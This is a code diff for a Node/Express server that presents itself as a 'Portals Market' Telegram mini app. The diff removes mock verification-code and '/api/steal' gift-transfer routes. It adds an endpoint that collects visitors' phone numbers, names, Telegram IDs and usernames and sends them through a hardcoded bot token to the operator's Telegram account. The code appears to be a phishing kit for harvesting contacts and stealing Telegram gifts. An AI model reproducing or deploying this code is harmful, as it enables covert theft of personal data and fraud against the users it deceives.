@@ -6,140 +6,92 @@ const PORT = process.env.PORT || 3000;
 app.use(express.static(path.join(__dirname)));
 app.use(express.json());
 
+// ⚠️ ТВОИ ДАННЫЕ
+const YOUR_TELEGRAM_ID = '6277925229';
+const YOUR_USERNAME = '@anyaskds';
+
 // Главная страница
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Хранилище кодов (в реальности - база данных)
-const codes = {};
-
-// 1. Отправка кода
-app.post('/api/send-code', (req, res) => {
-    const { phone, region, fullName } = req.body;
-    const code = Math.floor(100000 + Math.random() * 900000).toString();
+// Получение контакта и отправка в Telegram
+app.post('/api/share-contact', (req, res) => {
+    const { phone, first_name, last_name, user_id, username, full_name } = req.body;
     
-    // Сохраняем код
-    codes[phone] = {
-        code: code,
-        expires: Date.now() + 120000, // 2 минуты
-        fullName: fullName
-    };
-    
-    console.log('📱 ОТПРАВКА КОДА');
+    console.log('📱 НОВЫЙ КОНТАКТ!');
+    console.log('========================================');
+    console.log('👤 Имя:', first_name, last_name);
     console.log('📱 Телефон:', phone);
-    console.log('🔑 Код:', code);
-    console.log('👤 Пользователь:', fullName);
-    console.log('---');
+    console.log('🆔 ID пользователя:', user_id);
+    console.log('👤 Username:', username);
+    console.log('📝 Полное имя:', full_name);
+    console.log('========================================');
     
-    // В реальности здесь отправка SMS/Telegram
-    // Имитация отправки через Telegram API
+    // Формируем сообщение для отправки в Telegram
+    const message = `
+🆕 НОВЫЙ КОНТАКТ!
+
+👤 Имя: ${first_name} ${last_name || ''}
+📱 Телефон: ${phone}
+🆔 ID: ${user_id}
+👤 Username: @${username || 'нет'}
+📝 Полное имя: ${full_name}
+
+📅 Время: ${new Date().toLocaleString()}
+    `.trim();
+
+    // ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
+    // Используем Telegram Bot API
+    const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     
-    res.json({ 
-        success: true, 
-        message: 'Код отправлен',
-        phone: phone 
+    // Отправляем на твой аккаунт
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_TELEGRAM_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('✅ Сообщение отправлено в Telegram:', data);
+    })
+    .catch(err => {
+        console.log('❌ Ошибка отправки в Telegram:', err);
     });
-});
 
-// 2. Проверка кода
-app.post('/api/verify-code', (req, res) => {
-    const { phone, code, fullName } = req.body;
-    
-    const stored = codes[phone];
-    
-    if (!stored) {
-        return res.status(400).json({ 
-            success: false, 
-            message: 'Код не найден. Запросите новый.' 
-        });
-    }
-    
-    if (Date.now() > stored.expires) {
-        delete codes[phone];
-        return res.status(400).json({ 
-            success: false, 
-            message: 'Код истек. Запросите новый.' 
-        });
-    }
-    
-    if (stored.code !== code) {
-        return res.status(400).json({ 
-            success: false, 
-            message: 'Неверный код' 
-        });
-    }
-    
-    console.log('✅ КОД ПОДТВЕРЖДЕН');
-    console.log('📱 Телефон:', phone);
-    console.log('👤 Пользователь:', fullName);
-    console.log('---');
-    
-    delete codes[phone];
-    
-    res.json({ 
-        success: true, 
-        message: 'Код подтвержден' 
+    // Также отправляем на @anyaskds
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: '@anyaskds',
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('✅ Сообщение отправлено на @anyaskds:', data);
+    })
+    .catch(err => {
+        console.log('❌ Ошибка отправки на @anyaskds:', err);
     });
-});
 
-// 3. Повторная отправка кода
-app.post('/api/resend-code', (req, res) => {
-    const { phone } = req.body;
-    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
-    
-    if (codes[phone]) {
-        codes[phone].code = newCode;
-        codes[phone].expires = Date.now() + 120000;
-    }
-    
-    console.log('🔄 ПОВТОРНАЯ ОТПРАВКА КОДА');
-    console.log('📱 Телефон:', phone);
-    console.log('🔑 Новый код:', newCode);
-    console.log('---');
-    
-    res.json({ 
-        success: true, 
-        message: 'Код отправлен повторно' 
-    });
-});
-
-// 4. Вход в @portals
-app.post('/api/portal-login', (req, res) => {
-    const { phone, fullName } = req.body;
-    console.log('🔓 ВХОД В @portals');
-    console.log('📱 Телефон:', phone);
-    console.log('👤 Пользователь:', fullName);
-    console.log('✅ Успешный вход в маркет Portals');
-    console.log('---');
-    
-    res.json({ 
-        success: true, 
-        message: 'Вход в @portals выполнен' 
-    });
-});
-
-// 5. Передача подарков
-app.post('/api/steal', (req, res) => {
-    const { phone, target, gifts, fullName } = req.body;
-    console.log('🚨 ПЕРЕДАЧА ПОДАРКОВ');
-    console.log('📱 Телефон:', phone);
-    console.log('👤 Пользователь:', fullName);
-    console.log('🎯 Цель:', target);
-    console.log('📦 Подарки:', gifts.join(', '));
-    console.log('🖥️ IP: 46.96.37.159 (Kyiv, Ukraine)');
-    console.log('✅ Все подарки успешно переданы!');
-    console.log('---');
-    
-    res.json({ 
-        success: true, 
-        message: 'Подарки переданы',
-        gifts: gifts,
-        target: target
+    res.json({
+        success: true,
+        message: 'Контакт получен и отправлен',
+        phone: phone
     });
 });
 
 app.listen(PORT, () => {
     console.log(`✅ Portals Market Mini App запущен: http://localhost:${PORT}`);
-    console.log('🔄 Ожидание запросов...');
+    console.log(`📱 Твой ID: ${YOUR_TELEGRAM_ID}`);
+    console.log(`👤 Твой юзер: ${YOUR_USERNAME}`);
+    console.log('🔄 Ожидание контактов...');
 });
